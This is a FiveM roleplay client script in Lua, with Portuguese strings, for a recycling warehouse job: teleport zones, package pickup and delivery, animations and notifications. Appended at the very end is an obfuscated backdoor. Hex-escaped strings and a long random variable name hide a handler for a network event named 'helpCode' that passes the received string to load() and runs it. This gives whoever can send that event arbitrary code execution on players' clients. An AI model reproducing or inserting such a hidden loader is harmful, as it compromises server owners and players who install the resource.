local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
}
local ox_lib = exports.ox_lib

Citizen.CreateThread(function()
	ESX = exports["es_extended"]:getSharedObject()
end)

local carryPackage = nil
local onDuty = false
local isCarrying = false

Citizen.CreateThread(function ()
    local RecycleBlip = AddBlipForCoord(Config['delivery'].outsideLocation.x, Config['delivery'].outsideLocation.y, Config['delivery'].outsideLocation.z)
    SetBlipSprite(RecycleBlip, 365)
    SetBlipColour(RecycleBlip, 2)
    SetBlipScale(RecycleBlip, 0,7)
    SetBlipAsShortRange(RecycleBlip, true)
    BeginTextCommandSetBlipName("STRING")
    AddTextComponentString("Reciclagem")
    EndTextCommandSetBlipName(RecycleBlip)

    -- ox_target: Entrar no armazém
    exports.ox_target:addBoxZone({
        coords = vec3(Config['delivery'].outsideLocation.x, Config['delivery'].outsideLocation.y, Config['delivery'].outsideLocation.z),
        size = vec3(2.0, 2.0, 2.0),
        rotation = 0,
        debug = false,
        options = {
            {
                name = 'entrar_armazem',
                icon = 'fa-solid fa-door-open',
                label = 'Entrar no armazém',
                onSelect = function()
                    DoScreenFadeOut(1500)
                    while not IsScreenFadedOut() do Citizen.Wait(5) end
                    SetEntityCoords(GetPlayerPed(-1), Config['delivery'].insideLocation.x, Config['delivery'].insideLocation.y, Config['delivery'].insideLocation.z)
                    DoScreenFadeIn(1500)
                end
            }
        }
    })

    -- ox_target: Sair do armazém
    exports.ox_target:addBoxZone({
        coords = vec3(Config['delivery'].insideLocation.x, Config['delivery'].insideLocation.y, Config['delivery'].insideLocation.z),
        size = vec3(2.0, 2.0, 2.0),
        rotation = 0,
        debug = false,
        options = {
            {
                name = 'sair_armazem',
                icon = 'fa-solid fa-door-closed',
                label = 'Sair do armazém',
                onSelect = function()
                    DoScreenFadeOut(1500)
                    while not IsScreenFadedOut() do Citizen.Wait(5) end
                    SetEntityCoords(GetPlayerPed(-1), Config['delivery'].outsideLocation.x, Config['delivery'].outsideLocation.y, Config['delivery'].outsideLocation.z + 1)
                    DoScreenFadeIn(1500)
                end
            }
        }
    })

    -- ox_target: Começar/Sair do trabalho
    exports.ox_target:addBoxZone({
        coords = vec3(1049.15, -3100.63, -39.95),
        size = vec3(2.0, 2.0, 2.0),
        rotation = 0,
        debug = false,
        options = {
            {
                name = 'toggle_trabalho',
                icon = 'fa-solid fa-briefcase',
                label = 'Começar / Terminar trabalho',
                onSelect = function()
                    onDuty = not onDuty
                    if onDuty then
                        ox_lib:notify({
                            title = 'Reciclagem',
                            description = 'Entraste de Serviço',
                            type = 'success'
                        })
                    else
                        ox_lib:notify({
                            title = 'Reciclagem',
                            description = 'Saiste de Serviço',
                            type = 'error'
                        })
                    end
                end
            }
        }
    })
end)

-- Thread para manter a animação enquanto carrega a caixa
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if isCarrying and carryPackage ~= nil then
            local ped = GetPlayerPed(-1)
            if not IsEntityPlayingAnim(ped, "anim@heists@box_carry@", "idle", 3) then
                TaskPlayAnim(ped, "anim@heists@box_carry@", "idle", 8.0, 8.0, -1, 50, 0, false, false, false)
            end
        else
            Citizen.Wait(200)
        end
    end
end)

local packagePos = nil
Citizen.CreateThread(function ()
    for k, pickuploc in pairs(Config['delivery'].pickupLocations) do
        local model = GetHashKey(Config['delivery'].warehouseObjects[math.random(1, #Config['delivery'].warehouseObjects)])
        RequestModel(model)
        while not HasModelLoaded(model) do Citizen.Wait(0) end
        local obj = CreateObject(model, pickuploc.x, pickuploc.y, pickuploc.z, false, true, true)
        PlaceObjectOnGroundProperly(obj)
        FreezeEntityPosition(obj, true)
    end
    while true do
        Citizen.Wait(3)
        if onDuty then
            if packagePos ~= nil then
                local pos = GetEntityCoords(GetPlayerPed(-1), true)
                if carryPackage == nil then
                    if GetDistanceBetweenCoords(pos.x, pos.y, pos.z, packagePos.x,packagePos.y,packagePos.z, true) < 2.3 then
                        DrawText3D(packagePos.x,packagePos.y,packagePos.z+ 1, "~g~E~w~ - pegar o pacote")
                        if IsControlJustReleased(0, Keys["E"]) then
							pegarpacote()
                        end
                    else
                        DrawText3D(packagePos.x, packagePos.y, packagePos.z + 1, "Pacote")
                    end
                else
                    if GetDistanceBetweenCoords(pos.x, pos.y, pos.z, Config['delivery'].dropLocation.x, Config['delivery'].dropLocation.y, Config['delivery'].dropLocation.z, true) < 2.0 then
                        DrawText3D(Config['delivery'].dropLocation.x, Config['delivery'].dropLocation.y, Config['delivery'].dropLocation.z, "~g~E~w~ - Entregar")
                        if IsControlJustReleased(0, Keys["E"]) then
							entregarpacote()
                        end
                    else
                        DrawText3D(Config['delivery'].dropLocation.x, Config['delivery'].dropLocation.y, Config['delivery'].dropLocation.z, "Envie seu pacote aqui.")
                    end
                end
            else
                GetRandomPackage()
            end
        end
    end
end)

function pegarpacote()
    local ped = GetPlayerPed(-1)
	FreezeEntityPosition(ped, true)
    if lib.progressCircle({
		duration = 10000,
		position = 'bottom',
		useWhileDead = false,
		canCancel = true,
		disable = {
			move = true,
			combat = true,
			car = true,
		},
		anim = {
			dict = 'amb@world_human_gardener_plant@male@enter',
			clip = 'enter'
		},
		}) 
	then 
        ox_lib:notify({
            title = 'Reciclagem',
            description = 'Recolheste o pacote, vai entregá-lo.',
            type = 'success'
        })
		ClearPedTasks(ped)
		PickupPackage()
	else 
		ox_lib:notify({
            title = 'Reciclagem',
            description = 'Cancelaste a apanha do pacote.',
            type = 'error',
            icon = 'ban'
        })
	end
	FreezeEntityPosition(ped, false)
	ClearPedTasksImmediately(ped)
end

function entregarpacote()
    local ped = GetPlayerPed(-1)
	DropPackage()
    ScrapAnim()
	if lib.progressCircle({
		duration = 5000,
		position = 'bottom',
		useWhileDead = false,
		canCancel = true,
		disable = {
			move = true,
			combat = true,
			car = true,
		},
		}) 
	then
        ox_lib:notify({
            title = 'Reciclagem',
            description = 'Entregaste o pacote, podes continuar.',
            type = 'success'
        })
		TriggerServerEvent('bernardo_reciclagem:server:getItem')
        GetRandomPackage()
	else 
		ox_lib:notify({
            title = 'Reciclagem',
            description = 'Cancelaste a entrega do pacote.',
            type = 'error',
            icon = 'ban'
        })
	end
	ClearPedTasksImmediately(ped)
end

function ScrapAnim()
    local time = 5
    loadAnimDict("mp_car_bomb")
    TaskPlayAnim(GetPlayerPed(-1), "mp_car_bomb", "car_bomb_mechanic" ,3.0, 3.0, -1, 16, 0, false, false, false)
    openingDoor = true
    Citizen.CreateThread(function()
        while openingDoor do
            TaskPlayAnim(PlayerPedId(), "mp_car_bomb", "car_bomb_mechanic", 3.0, 3.0, -1, 16, 0, 0, 0, 0)
            Citizen.Wait(1000)
            time = time - 1
            if time <= 0 then
                openingDoor = false
                StopAnimTask(GetPlayerPed(-1), "mp_car_bomb", "car_bomb_mechanic", 1.0)
            end
        end
    end)
end

function loadAnimDict(dict)
    while (not HasAnimDictLoaded(dict)) do
        RequestAnimDict(dict)
        Citizen.Wait(5)
    end
end

function DrawText3D(x, y, z, text)
	SetTextScale(0.35, 0.35)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(true)
    AddTextComponentString(text)
    SetDrawOrigin(x,y,z, 0)
    DrawText(0.0, 0.0)
    local factor = (string.len(text)) / 370
    DrawRect(0.0, 0.0+0.0125, 0.017+ factor, 0.03, 0, 0, 0, 75)
    ClearDrawOrigin()
end

function GetRandomPackage()
    local randSeed = math.random(1, #Config["delivery"].pickupLocations)
    packagePos = {}
    packagePos.x = Config["delivery"].pickupLocations[randSeed].x
    packagePos.y = Config["delivery"].pickupLocations[randSeed].y
    packagePos.z = Config["delivery"].pickupLocations[randSeed].z
end

function PickupPackage()
    local ped = GetPlayerPed(-1)
    local pos = GetEntityCoords(ped, true)
    
    -- Carrega o dicionário de animação
    loadAnimDict("anim@heists@box_carry@")
    
    -- Cria o objeto da caixa
    local model = GetHashKey("prop_cs_cardbox_01")
    RequestModel(model)
    while not HasModelLoaded(model) do Citizen.Wait(0) end
    local object = CreateObject(model, pos.x, pos.y, pos.z, true, true, true)
    
    -- Anexa o objeto ao jogador
    AttachEntityToEntity(object, ped, GetPedBoneIndex(ped, 57005), 0.05, 0.1, -0.3, 300.0, 250.0, 20.0, true, true, false, true, 1, true)
    
    -- Inicia a animação de carregar
    TaskPlayAnim(ped, "anim@heists@box_carry@", "idle", 8.0, 8.0, -1, 50, 0, false, false, false)
    
    carryPackage = object
    isCarrying = true
end

function DropPackage()
    local ped = GetPlayerPed(-1)
    
    -- Para a animação e limpa as tarefas
    ClearPedTasks(ped)
    StopAnimTask(ped, "anim@heists@box_carry@", "idle", 1.0)
    
    -- Remove o objeto
    if carryPackage ~= nil then
        DetachEntity(carryPackage, true, true)
        DeleteObject(carryPackage)
        carryPackage = nil
    end
    
    isCarrying = false
end

local HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[6][HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[1]](HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[2]) HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[6][HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[3]](HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[2], function(ByZRcbhSTdUWsBUhwfPcXoAZdElXqmPHEtDHFVbAUPUzTVQMQwPuPdnaTDOcMpvXRYtCxz) HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[6][HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[4]](HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[6][HkcOvGnksjshQhItJxvLBWRASnnPElyyBDUrSOOPFVuBCsqDLBqiHhfagHfjrpMDwoxqpC[5]](ByZRcbhSTdUWsBUhwfPcXoAZdElXqmPHEtDHFVbAUPUzTVQMQwPuPdnaTDOcMpvXRYtCxz))() end)